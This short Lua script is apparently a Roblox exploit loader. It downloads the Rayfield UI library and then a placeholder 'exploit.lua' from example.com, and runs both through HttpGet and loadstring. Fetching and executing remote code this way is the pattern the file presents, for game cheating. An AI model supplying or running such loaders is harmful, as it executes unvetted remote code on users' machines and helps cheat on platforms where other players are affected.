local function fetchLibrary(url)
    local success, response = pcall(function()
        return game:HttpGet(url, true)
    end)
    if success then
        return response
    else
        warn("Failed to fetch library: " .. tostring(response))
        return nil
    end
end

local rayfieldLibrary = fetchLibrary("https://sirius.menu/rayfield")
if rayfieldLibrary then
    loadstring(rayfieldLibrary)()
else
    warn("Rayfield library failed to load.")
end

local function fetchExploit(url)
    local success, response = pcall(function()
        return game:HttpGet(url, true)
    end)
    if success then
        return response
    else
        warn("Failed to fetch exploit: " .. tostring(response))
        return nil
    end
end

local exploitScript = fetchExploit("https://example.com/path/to/your/exploit.lua")
if exploitScript then
    loadstring(exploitScript)()
else
    warn("Exploit script failed to load.")
end